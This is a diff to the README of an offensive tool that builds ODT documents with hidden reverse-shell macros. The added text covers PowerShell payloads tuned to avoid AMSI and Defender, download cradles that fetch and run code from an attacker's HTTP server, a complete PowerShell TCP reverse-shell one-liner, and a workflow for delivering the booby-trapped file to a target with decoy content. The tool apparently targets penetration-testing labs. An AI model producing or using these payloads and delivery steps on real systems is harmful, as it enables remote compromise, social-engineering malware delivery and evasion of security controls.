@@ -75,8 +75,17 @@ python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-bi
 # Windows — download nc.exe via PowerShell WebRequest
 python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-ps --http-port 8080
 
-# Windows — custom PowerShell command
-python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows --cmd 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://10.10.14.5/run.ps1")'
+# Windows — PowerShell one-liner (no base64, avoids AMSI -e detection)
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-oneliner
+
+# Windows — download cradle (short command, payload hosted on attacker)
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-download-cradle --http-port 8080
+
+# Windows — download cradle via Invoke-WebRequest (PowerShell 3.0+)
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-download-iwr
+
+# Windows — custom PowerShell command (inline, no base64)
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows --cmd "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/run.ps1')"
 
 # List all payloads
 python3 odt-revshell-generator.py --list
@@ -112,13 +121,17 @@ python3 odt-revshell-generator.py --list --os windows
 | `awk` | gawk | AWK /inet reverse shell |
 | `lua` | lua, luasocket | Lua (luasocket) reverse shell |
 
-### Windows (11 payloads)
+### Windows (15 payloads)
 
 | Payload | Requires | Description |
 |---------|----------|-------------|
 | `powershell` | powershell | PowerShell TCPClient (base64) |
 | `powershell-trycatch` | powershell | PowerShell with error handling |
 | `powershell-tls` | powershell | PowerShell TLS encrypted shell |
+| `ps-oneliner` | powershell | PowerShell TCPClient inline (no base64) |
+| `ps-oneliner-trycatch` | powershell | PowerShell inline with error handling |
+| `ps-download-cradle` | powershell, http server | Download cradle (Net.WebClient) |
+| `ps-download-iwr` | powershell 3.0+, http server | Download cradle (Invoke-WebRequest) |
 | `nc` | nc.exe on target | nc.exe -e cmd.exe |
 | `nc-download-certutil` | certutil | Download nc.exe from attacker via certutil, execute |
 | `nc-download-ps` | powershell | Download nc.exe from attacker via PowerShell, execute |
@@ -141,6 +154,26 @@ python3 -m http.server 8080
 
 # 2. Generate the ODT with a download payload
 python3 odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-wget --http-port 8080
+
+# 3. Start listener
+nc -lvnp 4444
+
+# 4. Deliver the ODT to the target
+```
+
+## PowerShell Download Cradle Workflow
+
+For Windows targets where AMSI or Defender blocks inline payloads, use a download cradle to keep the macro command short and serve the actual payload from your HTTP server:
+
+```bash
+# 1. On attacker — create a PowerShell reverse shell script
+cat > rev.ps1 << 'PS1'
+$c=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
+PS1
+python3 -m http.server 80
+
+# 2. Generate the ODT with a download cradle
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-download-cradle
 
 # 3. Start listener
 nc -lvnp 4444
@@ -201,7 +234,8 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 - Document body is an empty page — add decoy content for social engineering
 - Macro is stored in `Basic/Standard/Module1.xml` inside the ODT ZIP
 - Window style is set to `0` (hidden) for all payloads
-- Complex payloads with quoting issues are automatically base64-encoded for reliable delivery
+- `powershell*` payloads use base64 `-e` encoding; `ps-*` payloads use inline `-c` to avoid AMSI's base64 decoding hook
+- `--cmd` on Windows uses inline `-c` (no base64) for shorter, less detectable macros
 - Pre-commands run synchronously (Shell bSync=True) to ensure ordering before the main payload
 
 ## Disclaimer
